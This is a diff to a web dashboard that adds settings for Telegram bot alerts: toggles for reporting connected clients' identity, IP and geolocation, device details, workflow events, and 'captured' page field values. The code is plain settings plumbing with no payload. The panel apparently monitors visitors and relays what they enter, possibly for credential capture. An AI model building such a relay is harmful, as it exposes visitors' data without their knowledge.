@@ -8556,6 +8556,44 @@
                     </div>
 
                     <div class="tgbot-section">
+                        <div class="tgbot-section-title">Message Detail</div>
+                        <div class="tgbot-form">
+                            <div class="form-hint" style="margin-bottom:12px;">What each alert actually prints. Every line below is independent — switch all three
+                                <b>Client connected</b> groups off and that alert arrives as just <b>CLIENT CONNECTED</b>.</div>
+
+                            <div class="form-label" style="font-weight:600;margin-bottom:8px;">Client connected</div>
+                            <label class="form-label" style="display:flex;align-items:center;gap:10px;font-weight:500;cursor:pointer;margin-bottom:10px;">
+                                <input type="checkbox" id="tg-connect-identity" onchange="tgToggleChanged()" checked>
+                                <span>Identity <span class="form-hint">— time, workflow, pass code</span></span>
+                            </label>
+                            <label class="form-label" style="display:flex;align-items:center;gap:10px;font-weight:500;cursor:pointer;margin-bottom:10px;">
+                                <input type="checkbox" id="tg-connect-location" onchange="tgToggleChanged()" checked>
+                                <span>Location &amp; network <span class="form-hint">— IP, country, region, city, provider</span></span>
+                            </label>
+                            <label class="form-label" style="display:flex;align-items:center;gap:10px;font-weight:500;cursor:pointer;margin-bottom:14px;">
+                                <input type="checkbox" id="tg-connect-device" onchange="tgToggleChanged()" checked>
+                                <span>Device <span class="form-hint">— type, screen size, browser</span></span>
+                            </label>
+
+                            <div class="form-label" style="font-weight:600;margin-bottom:8px;">Workflow</div>
+                            <label class="form-label" style="display:flex;align-items:center;gap:10px;font-weight:500;cursor:pointer;margin-bottom:10px;">
+                                <input type="checkbox" id="tg-workflow-start-details" onchange="tgToggleChanged()" checked>
+                                <span>Started message details <span class="form-hint">— off = just “WORKFLOW STARTED”</span></span>
+                            </label>
+                            <label class="form-label" style="display:flex;align-items:center;gap:10px;font-weight:500;cursor:pointer;margin-bottom:14px;">
+                                <input type="checkbox" id="tg-workflow-finish-details" onchange="tgToggleChanged()" checked>
+                                <span>Finished message details <span class="form-hint">— off = just “WORKFLOW FINISHED”</span></span>
+                            </label>
+
+                            <div class="form-label" style="font-weight:600;margin-bottom:8px;">Captured details</div>
+                            <label class="form-label" style="display:flex;align-items:center;gap:10px;font-weight:500;cursor:pointer;margin-bottom:2px;">
+                                <input type="checkbox" id="tg-binding-details" onchange="tgToggleChanged()" checked>
+                                <span>Page values on sent pages <span class="form-hint">— a page you sent with your own values reports “name = value”, its page name and the time; off reports the plain field list</span></span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="tgbot-section">
                         <div class="tgbot-section-title">Connection Status</div>
                         <div class="tgbot-status" id="tgbot-status">
                             <div class="tgbot-status-indicator" id="tgbot-status-indicator"></div>
@@ -13906,6 +13944,12 @@
                     _setChk('tg-notify-security', tgConfig.notifyLpvSecurity !== false);
                     _setChk('tg-notify-lpv-final', tgConfig.notifyLpvFinal !== false);
                     _setChk('tg-notify-lpv-push', tgConfig.notifyLpvPush !== false);
+                    _setChk('tg-connect-identity', tgConfig.connectShowIdentity !== false);
+                    _setChk('tg-connect-location', tgConfig.connectShowLocation !== false);
+                    _setChk('tg-connect-device', tgConfig.connectShowDevice !== false);
+                    _setChk('tg-workflow-start-details', tgConfig.workflowStartDetails !== false);
+                    _setChk('tg-workflow-finish-details', tgConfig.workflowFinishDetails !== false);
+                    _setChk('tg-binding-details', tgConfig.bindingDetails !== false);
                     updateTelegramStatus();
                 }
                 const activityStored = localStorage.getItem('tgbot_activity');
@@ -13949,6 +13993,14 @@
                     tgConfig.notifyLpvSecurity = srv.notify_lpv_security !== false;
                     tgConfig.notifyLpvFinal = srv.notify_lpv_final !== false;
                     tgConfig.notifyLpvPush = srv.notify_lpv_push !== false;
+                    // What each message prints. Missing means "on", so an
+                    // older saved file still shows today's full messages.
+                    tgConfig.connectShowIdentity = srv.connect_show_identity !== false;
+                    tgConfig.connectShowLocation = srv.connect_show_location !== false;
+                    tgConfig.connectShowDevice = srv.connect_show_device !== false;
+                    tgConfig.workflowStartDetails = srv.workflow_start_show_details !== false;
+                    tgConfig.workflowFinishDetails = srv.workflow_finish_show_details !== false;
+                    tgConfig.bindingDetails = srv.binding_details_enabled !== false;
                     _setChk('tg-notify-connect', tgConfig.notifyConnect);
                     _setChk('tg-notify-disconnect', tgConfig.notifyDisconnect);
                     _setChk('tg-notify-navigate', tgConfig.notifyNavigate);
@@ -13958,6 +14010,12 @@
                     _setChk('tg-notify-security', tgConfig.notifyLpvSecurity);
                     _setChk('tg-notify-lpv-final', tgConfig.notifyLpvFinal);
                     _setChk('tg-notify-lpv-push', tgConfig.notifyLpvPush);
+                    _setChk('tg-connect-identity', tgConfig.connectShowIdentity);
+                    _setChk('tg-connect-location', tgConfig.connectShowLocation);
+                    _setChk('tg-connect-device', tgConfig.connectShowDevice);
+                    _setChk('tg-workflow-start-details', tgConfig.workflowStartDetails);
+                    _setChk('tg-workflow-finish-details', tgConfig.workflowFinishDetails);
+                    _setChk('tg-binding-details', tgConfig.bindingDetails);
                     localStorage.setItem('tgbot_config', JSON.stringify(tgConfig));
                     updateTelegramStatus();
                 } catch (e) { /* server config unavailable — local only */ }
@@ -13977,6 +14035,12 @@
             const notifyLpvSecurity = _chk('tg-notify-security', true);
             const notifyLpvFinal = _chk('tg-notify-lpv-final', true);
             const notifyLpvPush = _chk('tg-notify-lpv-push', true);
+            const connectShowIdentity = _chk('tg-connect-identity', true);
+            const connectShowLocation = _chk('tg-connect-location', true);
+            const connectShowDevice = _chk('tg-connect-device', true);
+            const workflowStartDetails = _chk('tg-workflow-start-details', true);
+            const workflowFinishDetails = _chk('tg-workflow-finish-details', true);
+            const bindingDetails = _chk('tg-binding-details', true);
 
             tgConfig = Object.assign({}, tgConfig, {
                 userId,
@@ -13989,7 +14053,13 @@
                 notifyLpvWorkflow,
                 notifyLpvSecurity,
                 notifyLpvFinal,
-                notifyLpvPush
+                notifyLpvPush,
+                connectShowIdentity,
+                connectShowLocation,
+                connectShowDevice,
+                workflowStartDetails,
+                workflowFinishDetails,
+                bindingDetails
             });
 
             try {
@@ -14019,7 +14089,13 @@
                         notify_lpv_workflow: notifyLpvWorkflow,
                         notify_lpv_security: notifyLpvSecurity,
                         notify_lpv_final: notifyLpvFinal,
-                        notify_lpv_push: notifyLpvPush
+                        notify_lpv_push: notifyLpvPush,
+                        connect_show_identity: connectShowIdentity,
+                        connect_show_location: connectShowLocation,
+                        connect_show_device: connectShowDevice,
+                        workflow_start_show_details: workflowStartDetails,
+                        workflow_finish_show_details: workflowFinishDetails,
+                        binding_details_enabled: bindingDetails
                     })
                 });
                 const result = await response.json().catch(() => ({}));
